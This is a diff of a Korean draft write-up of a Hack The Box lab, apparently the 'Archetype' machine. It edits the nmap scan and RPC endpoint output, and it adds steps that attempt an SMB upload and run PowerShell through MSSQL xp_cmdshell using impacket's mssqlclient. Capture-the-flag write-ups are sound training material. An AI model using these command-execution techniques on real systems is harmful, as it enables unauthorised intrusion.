@@ -16,7 +16,7 @@ draft: true
 우선 nmap으로 먼저 스캔해보자. 아래와 같이 탐지 내역이 꽤 많다. `rpc`, `smb`, `mssql` 관련된 port가 활성화 되어있는 것을 알 수 있다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
-└─# nmap -sC -sV 10.129.241.210
+└─# nmap -sCV 10.129.241.210
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 21:04 EST
 Nmap scan report for 10.129.241.210
 Host is up (0.27s latency).
@@ -171,40 +171,6 @@ Bindings:
           ncalrpc:[WindowsShutdown]
           ncacn_np:\\ARCHETYPE[\PIPE\InitShutdown]
           ncalrpc:[WMsgKRpc083610]
-
-Protocol: N/A
-Provider: winlogon.exe
-UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0
-Bindings:
-          ncalrpc:[WindowsShutdown]
-          ncacn_np:\\ARCHETYPE[\PIPE\InitShutdown]
-          ncalrpc:[WMsgKRpc083610]
-          ncalrpc:[WMsgKRpc084D11]
-
-Protocol: [MS-SCMR]: Service Control Manager Remote Protocol
-Provider: services.exe
-UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0
-Bindings:
-          ncacn_ip_tcp:10.129.95.187[49667]
-
-Protocol: [MS-FASP]: Firewall and Advanced Security Protocol
-Provider: FwRemoteSvr.dll
-UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
-Bindings:
-          ncacn_ip_tcp:10.129.95.187[49668]
-          ncalrpc:[ipsec]
-
-Protocol: [MS-CMPO]: MSDTC Connection Manager:
-Provider: msdtcprx.dll
-UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0
-Bindings:
-          ncalrpc:[LRPC-5575e284d83e243c4a]
-          ncalrpc:[OLE6330F0E7E7567E176E11548627E0]
-          ncalrpc:[LRPC-e43fa1f5a21c9d351f]
-          ncalrpc:[LRPC-e43fa1f5a21c9d351f]
-          ncalrpc:[LRPC-e43fa1f5a21c9d351f]
-
-[*] Received 266 endpoints.
 ```
 
 impacket의 mssqlclient 툴을 사용하여 접속할 수 있었다. `mssqlclient.py -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>`와 같은 형태로 접근하여 로그인에 성공하였다. 
@@ -287,9 +253,25 @@ output
 Access is denied.
 ```
 
+권한 상승을 위해 파일을 전달할 방법으로 처음에 사용했던 smb를 다시 사용해보고자 했다. 하지만 쓰기 권한이 없어 실패한다.
+``` bash
+smb: \> put rfi.php rfi.php
+NT_STATUS_ACCESS_DENIED opening remote file \rfi.php
+```
 
+다시 mssqlclient로 돌아와 어떤 방식으로 접근 가능할지 고민해보았고, 아래와 같이 powershell과 curl을 사용할 수 있음을 알 수 있다.
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell powershell
+output
+---------------------------------------------------------
+Windows PowerShell
 
+Copyright (C) Microsoft Corporation. All rights reserved.
 
+NULL
+
+PS C:\Windows\system32>
+```
 
 
 
